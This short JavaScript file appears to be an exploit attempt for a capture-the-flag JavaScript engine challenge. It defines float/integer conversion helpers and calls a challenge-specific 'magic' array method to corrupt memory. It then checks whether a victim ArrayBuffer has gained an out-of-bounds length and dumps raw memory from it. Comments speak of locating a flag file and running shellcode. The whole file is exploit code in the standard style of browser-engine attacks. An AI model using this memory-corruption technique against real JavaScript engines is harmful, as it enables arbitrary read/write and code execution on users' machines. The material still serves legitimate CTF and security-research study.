// Final exploit attempt - focus on what we know works
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u64 = new BigUint64Array(buf);

function d2u(d) {
    f64[0] = d;
    return u64[0];
}

function u2d(u) {
    u64[0] = u;
    return f64[0];
}

// Setup from test files
const N = 73;
let arr = [1.1, 2.2];
for (let i = 0; i < N; i++) {
    arr['p' + i] = i;
}

// Create ArrayBuffer that we want to corrupt
let victim_ab = new ArrayBuffer(0x1000);
let victim_dv = new DataView(victim_ab);

// Corruption
arr.magic(arr.length, 43);

// Check if corruption worked on ArrayBuffer
console.log("victim_ab.byteLength:", victim_ab.byteLength.toString(16));

// If it's huge, we have OOB read/write!
if (victim_ab.byteLength > 0x10000) {
    console.log("SUCCESS! Got OOB ArrayBuffer");
    
    // Read memory to find flag filename
    // /home/user/*.txt where * is MD5 hash
    // Try to find strings in memory or execute shellcode
    
    // For now, just dump some memory
    for (let i = 0; i < 0x100; i += 8) {
        try {
            let val = victim_dv.getBigUint64(i, true);
            if (val !== 0n) {
                console.log(`[${i.toString(16)}] = 0x${val.toString(16)}`);
            }
        } catch(e) {
            break;
        }
    }
} else {
    console.log("Corruption didn't create OOB ArrayBuffer");
    console.log("Length:", victim_ab.byteLength);
}
